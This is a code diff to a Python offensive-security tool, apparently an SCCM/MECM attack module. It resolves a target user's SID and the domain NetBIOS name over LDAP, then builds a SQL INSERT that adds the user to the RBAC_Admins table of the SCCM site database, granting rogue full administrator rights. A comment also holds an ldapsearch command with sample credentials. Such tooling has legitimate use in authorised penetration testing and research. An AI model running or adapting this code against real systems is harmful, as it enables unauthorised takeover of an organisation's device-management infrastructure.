@@ -23,6 +23,8 @@ class MSSQL:
             self.debug = debug
             self.target_user = target_user
             self.site_code = site_code
+            self.netbiosname = ""
+            self.query_sid = ""
     
     def run(self):
            
@@ -79,12 +81,38 @@ class MSSQL:
                 #REF: https://thehacker.recipes/ad/movement/sccm-mecm#1.-retreive-the-controlled-user-sid
                 hexsid = ldaptypes.LDAP_SID()
                 hexsid.fromCanonical(sid)
-                querysid = ('0x' + ''.join('{:02X}'.format(b) for b in hexsid.getData()))
-                logger.info(f'[*] Converted {self.target_user} SID to {querysid}')
-                self.mssql_abuse(querysid)
+                self.querysid = ('0x' + ''.join('{:02X}'.format(b) for b in hexsid.getData()))
+                logger.info(f'[*] Converted {self.target_user} SID to {self.querysid}')
+
         else:
             print("[-] Failed to resolve target SID.")
             return False
+        
+        try:
+            search_base = f"CN=Configuration,{self.search_base}"
+            search_filter = f"(&(objectclass=crossRef)(ncname={self.search_base}))"
+            self.ldap_session.extend.standard.paged_search(search_base=search_base, 
+                                                           search_filter=search_filter, 
+                                                           attributes="nETBIOSName",
+                                                           paged_size=1, 
+                                                           generator=False)  
+        except ldap3.core.exceptions.LDAPAttributeError as e:
+            print()
+            logger.info(f'[-] Error: {str(e)}')
+            exit()
+        if self.ldap_session.entries:
+            for entry in self.ldap_session.entries:
+                self.netbiosname = str(entry['nETBIOSName'])
+                logger.debug(f"[+] Found domain netbiosname: {self.netbiosname}")
+        else:
+            print("[-] Failed to resolve netbiosname.")
+            return False
+        
+        self.mssql_abuse(self.querysid)
+        '''
+        need to get the netbios name of the domain
+        ldapsearch -LLL -x -H ldap://10.10.100.76 -D 'bullshit\\administrator' -w 'P@ssw0rd' -b 'CN=Configuration,DC=blah,DC=blah' "(&(objectclass=crossRef)(ncname=DC=blah,DC=blah))" nETBIOSName
+        '''
         
     def mssql_abuse(self,hex_sid):
         hex_sid = hex_sid
@@ -93,7 +121,7 @@ class MSSQL:
         #is used just for display
         first_queries = f'''
         use CM_{self.site_code}
-        INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES ({hex_sid},'DOMAIN\\{self.target_user}',0,0,'','','','','{self.site_code}');
+        INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES ({hex_sid},'{self.netbiosname}\\{self.target_user}',0,0,'','','','','{self.site_code}');
         SELECT AdminID,LogonName FROM RBAC_Admins;
         '''
         logger.info(first_queries)
